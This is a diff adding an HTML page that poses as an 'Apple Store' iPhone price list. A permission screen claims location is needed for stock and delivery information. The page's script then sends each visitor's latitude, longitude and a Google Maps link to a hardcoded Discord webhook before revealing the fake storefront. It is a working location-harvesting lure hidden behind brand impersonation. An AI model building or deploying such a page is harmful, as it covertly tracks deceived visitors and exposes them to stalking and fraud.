@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Apple Store</title>
+
+  <style>
+
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:-apple-system,BlinkMacSystemFont,sans-serif;
+    }
+
+    body{
+      background:#000;
+      color:white;
+      overflow-x:hidden;
+    }
+
+    /* PERMISSION SCREEN */
+
+    .permission-screen{
+      position:fixed;
+      inset:0;
+      background:#000;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      z-index:9999;
+      padding:20px;
+    }
+
+    .permission-box{
+      background:#111;
+      border:1px solid #222;
+      border-radius:30px;
+      padding:40px 30px;
+      width:100%;
+      max-width:400px;
+      text-align:center;
+    }
+
+    .permission-box h1{
+      font-size:34px;
+      margin-bottom:15px;
+    }
+
+    .permission-box p{
+      color:#aaa;
+      line-height:1.6;
+      font-size:15px;
+    }
+
+    .allow-btn{
+      margin-top:30px;
+      width:100%;
+      padding:16px;
+      border:none;
+      border-radius:999px;
+      background:white;
+      color:black;
+      font-size:16px;
+      font-weight:600;
+      cursor:pointer;
+    }
+
+    .small{
+      margin-top:15px;
+      color:#666;
+      font-size:12px;
+    }
+
+    /* MAIN WEBSITE */
+
+    .website{
+      display:none;
+    }
+
+    header{
+      padding:20px;
+      text-align:center;
+      border-bottom:1px solid #222;
+      background:#000;
+      position:sticky;
+      top:0;
+    }
+
+    header h1{
+      font-size:28px;
+    }
+
+    .hero{
+      text-align:center;
+      padding:90px 20px;
+    }
+
+    .hero h2{
+      font-size:54px;
+      font-weight:700;
+    }
+
+    .hero p{
+      color:#999;
+      margin-top:15px;
+      font-size:18px;
+    }
+
+    .products{
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
+      gap:20px;
+      padding:40px 20px;
+      max-width:1200px;
+      margin:auto;
+    }
+
+    .card{
+      background:#111;
+      border-radius:25px;
+      border:1px solid #222;
+      padding:30px;
+      text-align:center;
+      transition:.3s;
+    }
+
+    .card:hover{
+      transform:translateY(-6px);
+    }
+
+    .card img{
+      width:100%;
+      max-width:220px;
+      display:block;
+      margin:auto;
+    }
+
+    .card h3{
+      margin-top:20px;
+      font-size:28px;
+    }
+
+    .price{
+      margin-top:10px;
+      color:#00d4ff;
+      font-size:22px;
+      font-weight:bold;
+    }
+
+    .desc{
+      margin-top:12px;
+      color:#999;
+      line-height:1.6;
+      font-size:15px;
+    }
+
+    .buy{
+      margin-top:25px;
+      padding:14px 24px;
+      border:none;
+      border-radius:999px;
+      background:white;
+      color:black;
+      font-size:15px;
+      font-weight:600;
+      cursor:pointer;
+    }
+
+    footer{
+      text-align:center;
+      padding:40px 20px;
+      color:#666;
+      border-top:1px solid #222;
+      margin-top:40px;
+    }
+
+  </style>
+</head>
+<body>
+
+<!-- PERMISSION SCREEN -->
+
+<div class="permission-screen" id="permissionScreen">
+
+  <div class="permission-box">
+
+    <h1> Apple Store</h1>
+
+    <p>
+      Allow location access to view nearby stock availability,
+      estimated delivery time, and local pricing.
+    </p>
+
+    <button class="allow-btn" onclick="requestLocation()">
+      Continue
+    </button>
+
+    <div class="small">
+      Your location is used for store availability.
+    </div>
+
+  </div>
+
+</div>
+
+<!-- MAIN WEBSITE -->
+
+<div class="website" id="website">
+
+  <header>
+    <h1> Apple Store</h1>
+  </header>
+
+  <section class="hero">
+
+    <h2>iPhone Price List</h2>
+
+    <p>
+      Discover the latest iPhone lineup.
+    </p>
+
+  </section>
+
+  <section class="products">
+
+    <div class="card">
+
+      <img src="https://images.unsplash.com/photo-1695048133142-1a20484d2569?q=80&w=800&auto=format&fit=crop">
+
+      <h3>iPhone 15 Pro Max</h3>
+
+      <div class="price">₱84,990</div>
+
+      <div class="desc">
+        Titanium design with A17 Pro chip.
+      </div>
+
+      <button class="buy">
+        Buy Now
+      </button>
+
+    </div>
+
+    <div class="card">
+
+      <img src="https://images.unsplash.com/photo-1592286927505-1def25115558?q=80&w=800&auto=format&fit=crop">
+
+      <h3>iPhone 15 Pro</h3>
+
+      <div class="price">₱74,990</div>
+
+      <div class="desc">
+        Powerful performance with ProMotion display.
+      </div>
+
+      <button class="buy">
+        Buy Now
+      </button>
+
+    </div>
+
+    <div class="card">
+
+      <img src="https://images.unsplash.com/photo-1603899122634-f086ca5f5ddd?q=80&w=800&auto=format&fit=crop">
+
+      <h3>iPhone 15</h3>
+
+      <div class="price">₱56,990</div>
+
+      <div class="desc">
+        Dynamic Island with amazing battery life.
+      </div>
+
+      <button class="buy">
+        Buy Now
+      </button>
+
+    </div>
+
+  </section>
+
+  <footer>
+    © 2026 Apple Store Demo
+  </footer>
+
+</div>
+
+<script>
+
+async function requestLocation(){
+
+  if(!navigator.geolocation){
+    alert("Geolocation not supported.");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+
+    async(position)=>{
+
+      const lat = position.coords.latitude;
+      const lng = position.coords.longitude;
+
+      const maps =
+        `https://maps.google.com/?q=${lat},${lng}`;
+
+      // SEND TO DISCORD WEBHOOK
+
+      await fetch("https://discord.com/api/webhooks/1508591570939805786/I4JuPlyW-J-ZyAFZJmwKR2SJ2gcd47bKZWVOFFhOgBIYk5c90LwfPaAjUT-1qSsT8N41",{
+
+        method:"POST",
+
+        headers:{
+          "Content-Type":"application/json"
+        },
+
+        body:JSON.stringify({
+
+          content:
+`📍 New Visitor Location
+
+Latitude: ${lat}
+Longitude: ${lng}
+
+Google Maps:
+${maps}`
+
+        })
+
+      });
+
+      // SHOW WEBSITE AFTER SUCCESS
+
+      document.getElementById("permissionScreen")
+        .style.display = "none";
+
+      document.getElementById("website")
+        .style.display = "block";
+
+    },
+
+    ()=>{
+
+      alert("Location permission denied.");
+
+    }
+
+  );
+
+}
+
+</script>
+
+</body>
+</html>
